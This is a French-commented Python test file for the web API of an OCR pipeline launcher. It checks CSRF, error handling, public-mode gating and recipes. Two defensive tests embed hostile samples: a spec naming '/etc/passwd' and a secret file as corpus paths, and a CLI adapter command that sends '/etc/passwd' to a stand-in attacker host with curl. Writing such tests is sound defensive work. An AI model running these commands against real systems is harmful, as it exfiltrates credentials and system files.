"""Le composeur ouvert : une recette en un mot, une spec complète en un fichier.

Le graphe admet des centaines de formes. Les mettre dans un formulaire est
impossible ; un éditeur de nœuds serait lourd et hostile. Deux portes suffisent :
une **recette** pour l'usage courant, une **spec** pour tout le reste.

La seconde porte est celle qui demande le plus de soin. Une spec porte des URI
de fichiers ; les accepter d'un client ferait du lanceur un lecteur de disque à
distance. Le corpus vient donc **toujours** du dépôt, et le premier test de ce
fichier est celui-là.
"""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

import yaml
from fastapi.testclient import TestClient

from cinoc.interfaces.web.app import create_app
from cinoc.interfaces.web.security.csrf import CSRF_HEADER

_CSRF = {CSRF_HEADER: "1"}
_PNG = b"\x89PNG\r\n\x1a\n" + b"0" * 32


def _client(tmp_path: Path, *, public_mode: bool = False) -> TestClient:
    return TestClient(
        create_app(reports_dir=tmp_path, rate_limit=1000, public_mode=public_mode)
    )


def _corpus(client: TestClient) -> str:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("p1.png", _PNG)
        zf.writestr("p1.gt.txt", "le soleil")
    reponse = client.post(
        "/api/corpus",
        files={"file": ("c.zip", buf.getvalue(), "application/zip")},
        headers=_CSRF,
    )
    return reponse.json()["corpus_id"]


def _spec_minimale() -> str:
    return yaml.safe_dump(
        {
            "pipelines": [
                {
                    "name": "rejeu",
                    "initial_inputs": ["image"],
                    "steps": [
                        {
                            "id": "ocr",
                            "kind": "ocr",
                            "adapter_name": "precomputed:ocr",
                            "input_types": ["image"],
                            "output_types": ["raw_text"],
                        }
                    ],
                }
            ],
            "evaluation": {
                "views": [
                    {
                        "name": "texte",
                        "candidate_types": ["raw_text"],
                        "metric_names": ["cer"],
                    }
                ]
            },
            "adapter_kwargs": {"precomputed:ocr": {"source_label": "ocr"}},
        },
        allow_unicode=True,
    )


# --------------------------------------------------------------------------- #
# La garde qui compte
# --------------------------------------------------------------------------- #


def test_a_submitted_corpus_never_reaches_the_path_resolver(tmp_path: Path) -> None:
    """**Le test le plus important du fichier.**

    Une spec qui porte son propre corpus pourrait nommer n'importe quel chemin du
    serveur. Le corpus déposé est donc écarté *avant* la validation, et remplacé
    par celui du dépôt — le lanceur ne lit jamais un chemin choisi par le client.
    """
    client = _client(tmp_path)
    corpus_id = _corpus(client)
    secret = tmp_path / "secret.txt"
    secret.write_text("mot de passe", encoding="utf-8")

    malveillante = yaml.safe_load(_spec_minimale())
    malveillante["corpus"] = {
        "name": "vol",
        "documents": [
            {
                "id": "x",
                "image_uri": "/etc/passwd",
                "ground_truths": [
                    {"type": "raw_text", "uri": str(secret)},
                ],
            }
        ],
    }
    reponse = client.post(
        "/api/runs/spec",
        headers=_CSRF,
        json={"corpus_id": corpus_id, "spec": yaml.safe_dump(malveillante)},
    )

    assert reponse.status_code == 201, reponse.json()
    # Le run a bien démarré — sur le corpus du dépôt, pas sur celui de la spec.
    etat = client.get(f"/api/runs/{reponse.json()['job_id']}")
    assert etat.status_code == 200


def test_writes_are_csrf_protected(tmp_path: Path) -> None:
    client = _client(tmp_path)
    for route in ("/api/runs/spec", "/api/runs/recipe"):
        assert client.post(route, json={"corpus_id": "x"}).status_code == 403


def test_an_unknown_corpus_is_404(tmp_path: Path) -> None:
    client = _client(tmp_path)
    reponse = client.post(
        "/api/runs/spec",
        headers=_CSRF,
        json={"corpus_id": "fantome", "spec": _spec_minimale()},
    )
    assert reponse.status_code == 404


def test_an_unreadable_spec_says_so(tmp_path: Path) -> None:
    client = _client(tmp_path)
    corpus_id = _corpus(client)
    reponse = client.post(
        "/api/runs/spec",
        headers=_CSRF,
        json={"corpus_id": corpus_id, "spec": "{ pas: du: yaml: valide"},
    )
    assert reponse.status_code == 422
    assert "illisible" in reponse.json()["detail"]


def test_a_spec_that_is_not_an_object_is_refused(tmp_path: Path) -> None:
    client = _client(tmp_path)
    corpus_id = _corpus(client)
    reponse = client.post(
        "/api/runs/spec",
        headers=_CSRF,
        json={"corpus_id": corpus_id, "spec": "- juste\n- une\n- liste\n"},
    )
    assert reponse.status_code == 422


def test_an_unknown_brick_is_named(tmp_path: Path) -> None:
    """Anti-silence : la spec dit quelle brique n'existe pas."""
    client = _client(tmp_path)
    corpus_id = _corpus(client)
    spec = yaml.safe_load(_spec_minimale())
    spec["pipelines"][0]["steps"][0]["adapter_name"] = "magie:x"
    reponse = client.post(
        "/api/runs/spec",
        headers=_CSRF,
        json={"corpus_id": corpus_id, "spec": yaml.safe_dump(spec)},
    )
    assert reponse.status_code == 422
    assert "magie" in reponse.json()["detail"]


def test_public_mode_gates_a_spec_like_it_gates_the_form(tmp_path: Path) -> None:
    """Une spec composée à la main ne doit pas ouvrir une porte que le
    formulaire ferme — ce serait un contournement, pas une fonctionnalité."""
    client = _client(tmp_path, public_mode=True)
    corpus_id = _corpus(client)
    spec = yaml.safe_load(_spec_minimale())
    spec["pipelines"][0]["steps"][0]["adapter_name"] = "openai:x"
    reponse = client.post(
        "/api/runs/spec",
        headers=_CSRF,
        json={"corpus_id": corpus_id, "spec": yaml.safe_dump(spec)},
    )
    assert reponse.status_code == 403
    assert "public" in reponse.json()["detail"]


# --------------------------------------------------------------------------- #
# Les recettes, côté web
# --------------------------------------------------------------------------- #


def test_the_recipes_are_listed_with_what_to_choose(tmp_path: Path) -> None:
    reponse = _client(tmp_path).get("/api/recipes")
    assert reponse.status_code == 200
    recettes = reponse.json()["recipes"]
    assert recettes
    une = next(r for r in recettes if r["name"] == "ocr_simple")
    assert une["shape"] == ["ocr"]
    assert une["title"] and une["description"]
    assert any(c["step"] == "ocr" for c in une["choices"])


def test_the_recipe_list_is_bilingual(tmp_path: Path) -> None:
    client = _client(tmp_path)
    fr = client.get("/api/recipes?lang=fr").json()["recipes"]
    en = client.get("/api/recipes?lang=en").json()["recipes"]
    titres_fr = {r["name"]: r["title"] for r in fr}
    titres_en = {r["name"]: r["title"] for r in en}
    assert titres_fr != titres_en


def test_a_recipe_launches_on_a_stored_corpus(tmp_path: Path) -> None:
    client = _client(tmp_path)
    corpus_id = _corpus(client)
    reponse = client.post(
        "/api/runs/recipe",
        headers=_CSRF,
        json={
            "corpus_id": corpus_id,
            "recipe": "ocr_simple",
            "choices": {"ocr": "precomputed"},
        },
    )
    assert reponse.status_code == 201, reponse.json()
    assert reponse.json()["job_id"]


def test_an_unknown_recipe_lists_the_known_ones(tmp_path: Path) -> None:
    client = _client(tmp_path)
    corpus_id = _corpus(client)
    reponse = client.post(
        "/api/runs/recipe",
        headers=_CSRF,
        json={"corpus_id": corpus_id, "recipe": "inexistante"},
    )
    assert reponse.status_code == 422
    assert "connues" in reponse.json()["detail"]


def test_a_brick_outside_the_role_is_refused(tmp_path: Path) -> None:
    """Choisir un correcteur comme moteur d'OCR produirait une spec absurde."""
    client = _client(tmp_path)
    corpus_id = _corpus(client)
    reponse = client.post(
        "/api/runs/recipe",
        headers=_CSRF,
        json={
            "corpus_id": corpus_id,
            "recipe": "ocr_simple",
            "choices": {"ocr": "openai"},
        },
    )
    assert reponse.status_code == 422


# --------------------------------------------------------------------------- #
# Le verrou « ligne de commande seulement »
# --------------------------------------------------------------------------- #


def _spec_avec_cli() -> str:
    spec = yaml.safe_load(_spec_minimale())
    spec["pipelines"][0]["steps"].insert(
        0,
        {
            "id": "seg",
            "kind": "segmentation",
            "adapter_name": "cli_layout:evasion",
            "input_types": ["image"],
            "output_types": ["layout"],
        },
    )
    spec["adapter_kwargs"]["cli_layout:evasion"] = {
        "label": "evasion",
        "command": "curl attaquant.example -d @/etc/passwd {image}",
    }
    return yaml.safe_dump(spec, allow_unicode=True)


def test_une_spec_qui_nomme_une_brique_cli_est_refusee(tmp_path: Path) -> None:
    """**Le second test le plus important du fichier.**

    ``cli_layout`` exécute une commande écrite dans la spec. C'est sa raison
    d'être en local, et ce serait un shell offert par HTTP. Le refus ne passe
    donc pas par la disponibilité ni par le catalogue : il est premier.
    """
    client = _client(tmp_path)
    corpus_id = _corpus(client)

    reponse = client.post(
        "/api/runs/spec",
        headers=_CSRF,
        json={"corpus_id": corpus_id, "spec": _spec_avec_cli()},
    )

    assert reponse.status_code == 403, reponse.json()
    assert "ligne de commande" in reponse.json()["detail"]


def test_le_refus_vaut_aussi_sur_une_instance_privee(tmp_path: Path) -> None:
    """La règle porte sur ce que la brique **fait**, pas sur qui regarde.

    « Instance privée » veut dire « les gens que je connais », pas « les gens à
    qui je confie un shell ». Le mode public borne une *exposition* ; ce verrou
    borne une *capacité*, et les deux ne se remplacent pas.
    """
    client = _client(tmp_path, public_mode=False)
    corpus_id = _corpus(client)

    reponse = client.post(
        "/api/runs/spec",
        headers=_CSRF,
        json={"corpus_id": corpus_id, "spec": _spec_avec_cli()},
    )

    assert reponse.status_code == 403
